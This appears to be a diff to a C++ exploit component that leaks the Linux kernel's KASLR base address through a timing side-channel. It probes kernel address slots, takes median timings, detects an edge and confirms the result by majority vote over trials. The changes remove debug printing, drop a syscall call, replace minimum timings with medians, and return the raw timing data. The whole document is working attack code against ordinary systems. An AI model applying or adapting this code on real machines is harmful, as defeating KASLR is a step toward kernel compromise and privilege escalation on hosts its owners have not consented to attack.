@@ -24,6 +24,7 @@
 #include <iostream>
 #include <sys/syscall.h>
 #include <unistd.h>
+#include <immintrin.h>
 
 bool is_kaslr_base(uint64_t kbase_addr) {
     if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000)
@@ -86,17 +87,13 @@ std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
     }
     uint64_t threshold = max_diff / 2;
 
-    std::cout << "median: " << median << " threshold: " << threshold << std::endl;
-    for (size_t slot = 0; slot < timings.size(); slot++) {
-        printf("%lx: %lu \n", slot_to_addr(slot), timings[slot]);
-    }
-
     for (size_t slot = 0; slot < timings.size(); slot++) {
         uint64_t diff = abs_diff(timings[slot], median);
         if (diff >= threshold) {
             return slot;
         }
     }
+
     return std::nullopt;
 }
 
@@ -151,26 +148,31 @@ uint64_t sidechannel(uint64_t addr) {
     return delta;
 }
 
-std::optional<uint64_t> try_leak_kaslr_base(int samples) {
+std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
-    std::vector<uint64_t> timings(slots, std::numeric_limits<uint64_t>::max());
+    std::vector<std::vector<uint64_t>> all_timings(slots);
+    for (auto& t : all_timings) {
+        t.reserve(samples);
+    }
 
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
-            syscall(104);
             uint64_t timing = sidechannel(addr);
-            if (timing < timings[slot]) {
-                timings[slot] = timing;
-            }
+            all_timings[slot].push_back(timing);
         }
+    }
+
+    std::vector<uint64_t> timings(slots);
+    for (size_t slot = 0; slot < slots; slot++) {
+        timings[slot] = compute_median(all_timings[slot]);
     }
 
     std::optional<size_t> slot = try_find_edge(timings);
     if (slot.has_value()) {
-        return slot_to_addr(*slot);
+        return {slot_to_addr(*slot), timings};
     }
-    return std::nullopt;
+    return {std::nullopt, timings};
 }
 
 std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>& slots) {
@@ -205,11 +207,15 @@ std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>
     return std::nullopt;
 }
 
-uint64_t leak_kaslr_base(int samples, int trials) {
+uint64_t leak_kaslr_base(int samples, int trials, std::vector<std::vector<uint64_t>>* debug_data) {
     std::vector<std::optional<uint64_t>> slots(trials);
     for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
         for (int trial = 0; trial < trials; trial++) {
-            slots[trial] = try_leak_kaslr_base(samples);
+            auto result = try_leak_kaslr_base(samples);
+            slots[trial] = result.first;
+            if (debug_data) {
+                 debug_data->push_back(result.second);
+            }
         }
         std::optional<uint64_t> slot = find_majority(slots);
         if (slot.has_value()) {
